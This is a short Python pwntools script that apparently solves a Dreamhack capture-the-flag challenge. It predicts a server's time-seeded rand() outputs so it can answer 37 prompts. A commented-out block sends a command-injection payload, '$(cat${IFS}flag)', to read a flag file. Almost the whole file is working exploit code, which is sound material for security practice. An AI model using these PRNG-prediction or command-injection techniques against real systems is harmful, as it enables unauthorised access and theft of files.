from pwn import *
from ctypes import *
from time import *

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

key = []

context.log_level = 'debug'
#context.log_level = 'info'

LOCALHOST = "host3.dreamhack.games"
NUMBER = 20799

p=remote(LOCALHOST, NUMBER)
libc.srand(libc.time(0))

#read all and input all
for i in range(0, 37):
	key.append('l' if libc.rand()%2 == 0 else 'h')
	libc.rand()%2

for i in range(len(key)):
	p.recvuntil(b':')
	p.recvuntil(b' ')		# read until ' '
	p.sendline(key[i])

p.interactive()

"""
p.recvuntil(b":")
p.recvuntil(b" ")
p.sendline("$(cat${IFS}flag)")
flag = []

#get all info
try:
	while True:
		flag.append(p.recvline())
finally:
	print(flag)
	break
"""
		
		
